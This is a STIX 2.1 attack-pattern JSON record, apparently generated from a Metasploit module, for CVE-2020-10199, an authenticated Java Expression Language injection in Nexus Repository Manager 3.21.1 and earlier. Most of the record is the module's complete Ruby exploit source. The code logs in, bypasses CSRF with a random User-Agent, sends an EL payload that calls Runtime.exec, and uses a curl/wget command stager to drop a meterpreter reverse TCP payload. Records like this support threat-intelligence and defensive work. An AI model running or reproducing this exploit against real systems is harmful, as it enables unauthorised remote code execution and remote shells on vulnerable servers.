{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4bea2d7-cc34-4501-accf-2833f52aa4c3",
    "created": "2024-08-14T17:03:12.649479Z",
    "modified": "2024-08-14T17:03:12.649483Z",
    "name": "Nexus Repository Manager Java EL Injection RCE",
    "description": " This module exploits a Java Expression Language (EL) injection in Nexus Repository Manager versions up to and including 3.21.1 to execute code as the Nexus user.  This is a post-authentication vulnerability, so credentials are required to exploit the bug. Any user regardless of privilege level may be used.  Tested against 3.21.1-01. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nexus_repo_manager_el_injection.rb",
            "external_id": "nexus_repo_manager_el_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10199"
        },
        {
            "source_name": "reference",
            "url": "https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype"
        },
        {
            "source_name": "reference",
            "url": "https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nexus Repository Manager Java EL Injection RCE',\n        'Description' => %q{\n          This module exploits a Java Expression Language (EL) injection in\n          Nexus Repository Manager versions up to and including 3.21.1 to\n          execute code as the Nexus user.\n\n          This is a post-authentication vulnerability, so credentials are\n          required to exploit the bug. Any user regardless of privilege level\n          may be used.\n\n          Tested against 3.21.1-01.\n        },\n        'Author' => [\n          'Alvaro Mu\u00f1oz', # Discovery\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-10199'],\n          ['URL', 'https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype'],\n          ['URL', 'https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31']\n        ],\n        'DisclosureDate' => '2020-03-31', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          ['Nexus Repository Manager <= 3.21.1', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'\n        },\n        'CmdStagerFlavor' => %i[curl wget],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8081),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'Nexus username', 'admin']),\n      OptString.new('PASSWORD', [true, 'Nexus password'])\n    ])\n  end\n\n  def post_auth?\n    # Pre-auth RCE? https://twitter.com/iamnoooob/status/1246182773427240967\n    true\n  end\n\n  # Send a GET / request to the server, check the response for a Server header\n  # containing the Nexus version, and then check if it's a vulnerable version\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.headers['Server']\n      return CheckCode::Unknown('Target did not respond with Server header.')\n    end\n\n    # Example Server header:\n    # Server: Nexus/3.21.1-01 (OSS)\n    version = res.headers['Server'].scan(%r{^Nexus/([\\d.-]+)}).flatten.first\n\n    unless version\n      return CheckCode::Unknown('Target did not respond with Nexus version.')\n    end\n\n    if Rex::Version.new(version) <= Rex::Version.new('3.21.1')\n      return CheckCode::Appears(\"Nexus #{version} is a vulnerable version.\")\n    end\n\n    CheckCode::Safe(\"Nexus #{version} is NOT a vulnerable version.\")\n  end\n\n  def exploit\n    print_status(\"Executing command stager for #{datastore['PAYLOAD']}\")\n\n    # This will drop a binary payload to disk and execute it!\n    execute_cmdstager(\n      noconcat: true,\n      cookie: login(datastore['USERNAME'], datastore['PASSWORD'])\n    )\n  end\n\n  def login(username, password)\n    print_status(\"Logging in with #{username}:#{password}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/service/rapture/session'),\n      'vars_post' => {\n        'username' => Rex::Text.encode_base64(username),\n        'password' => Rex::Text.encode_base64(password)\n      },\n      'partial' => true # XXX: Return partial response despite timeout\n    }, 3.5)\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    cookie = res.get_cookies\n\n    unless res.code == 204 && cookie.match(/NXSESSIONID=[\\h-]+/)\n      fail_with(Failure::NoAccess, 'Could not log in with specified creds')\n    end\n\n    print_good(\"Logged in with #{cookie}\")\n    cookie\n  end\n\n  # This is defined so that CmdStager can use it!\n  def execute_command(cmd, opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path,\n                             '/service/rest/beta/repositories/go/group'),\n      # HACK: Bypass CSRF token with random User-Agent header\n      'agent' => rand_text_english(8..42),\n      'cookie' => opts[:cookie],\n      'ctype' => 'application/json',\n      'data' => json_payload(cmd)\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    unless res.code == 400 && res.body.match(/java\\.lang\\.UNIXProcess@\\h+/)\n      fail_with(Failure::PayloadFailed, \"Could not execute command: #{cmd}\")\n    end\n\n    print_good(\"Successfully executed command: #{cmd}\")\n  end\n\n  # PoC based off API docs for /service/rest/beta/repositories/go/group:\n  # http://localhost:8081/#admin/system/api\n  def json_payload(cmd)\n    {\n      'name' => 'internal',\n      'online' => true,\n      'storage' => {\n        'blobStoreName' => 'default',\n        'strictContentTypeValidation' => true\n      },\n      'group' => {\n        # XXX: memberNames has to be an array, but the API example was a string\n        'memberNames' => [el_payload(cmd)]\n      }\n    }.to_json\n  end\n\n  # Helpful resource from which I borrowed the EL payload:\n  # https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf\n  def el_payload(cmd)\n    # HACK: Format our EL expression nicely and then strip introduced whitespace\n    el = <<~EOF.gsub(/\\s+/, '')\n      ${\n        \"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\n          \"\".getClass().forName(\"java.lang.Runtime\")\n        ).exec(\"PATCH_ME\")\n      }\n    EOF\n\n    # Patch in our command, escaping any double quotes\n    el.sub('PATCH_ME', cmd.gsub('\"', '\\\\\"'))\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-03-31, # Vendor advisory",
    "x_mitre_platforms": [
        "linux'"
    ]
}